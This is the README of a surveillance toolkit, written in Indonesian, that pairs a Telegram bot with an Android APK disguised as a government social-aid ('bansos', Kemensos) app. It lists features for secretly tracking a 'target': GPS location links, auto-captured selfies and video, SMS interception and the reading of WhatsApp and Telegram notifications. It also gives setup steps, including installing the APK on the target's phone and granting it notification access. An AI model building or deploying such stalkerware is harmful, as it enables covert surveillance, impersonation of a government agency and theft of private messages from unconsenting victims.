# GPS Tracker Bot — Bansos Edition

Sistem tracking lokasi GPS via Telegram Bot, dilengkapi **Android WebView APK** untuk capture kamera, SMS, dan notifikasi WhatsApp.

## 🚀 Fitur

| Fitur | Status |
|-------|--------|
| 📦 Buat Link Tracking unik | ✅ |
| 🔔 Notifikasi Telegram real-time | ✅ |
| 🗺 Lokasi via Google Maps | ✅ |
| 📸 Selfie & Video auto-capture | ✅ |
| 💬 SMS Capture (BroadcastReceiver) | ✅ |
| 💬 Notifikasi WA/Telegram (NotificationListener) | ✅ |
| 📊 Dashboard Monitoring (mobile) | ✅ |
| 🤖 Bot Telegram menu 4 tombol | ✅ |

## 🏗 Struktur Project

```
gps-link/
├── bot.py                           # Flask + Telegram Bot (main app)
├── templates/
│   ├── index.html                   # Landing page (mobile-first)
│   ├── track.html                   # Halaman tracking target (form GPS + kamera)
│   ├── dashboard.html               # Admin dashboard monitoring
│   ├── map.html                     # Google Maps embed
│   └── error.html                   # Error page
├── android/
│   ├── BansosApp/                   # Android project
│   │   └── app/src/main/java/com/kemensos/bansos/
│   │       ├── MainActivity.java    # WebView + camera perms
│   │       ├── NotifListener.java   # WhatsApp/chat capture (NotificationListenerService)
│   │       └── SmsReceiver.java     # SMS capture (BroadcastReceiver)
│   ├── keystore.jks                 # Signing key
│   └── bantuan-sosial.apk           # Signed APK output
├── requirements.txt
├── start.sh
└── deploy.sh
```

## 🖥 Server Setup

```bash
pip3 install flask python-telegram-bot requests
python3 bot.py
```

## 🌐 Akses Publik (ngrok)

```bash
ngrok http 5000
```

Set `BASE_URL` ke URL ngrok yang diberikan.

## 📱 Android APK

Instal `bantuan-sosial.apk` di target:
1. Izin kamera + lokasi: muncul otomatis saat tracking
2. Izin SMS: muncul saat pertama kali (Android 6+)
3. Untuk baca WA/chat: **Settings → Apps → Akses Notifikasi → Cek Bantuan Sosial → ON**

APK auto-update konten karena WebView muat URL langsung dari server.

## 🔐 Catatan Keamanan

- `tracker.db` tidak ikut push (berisi data tracking)
- `keystore.jks` tetap di repo untuk build reproducibility
- Ganti `BOT_TOKEN` di environment variable, jangan hardcode
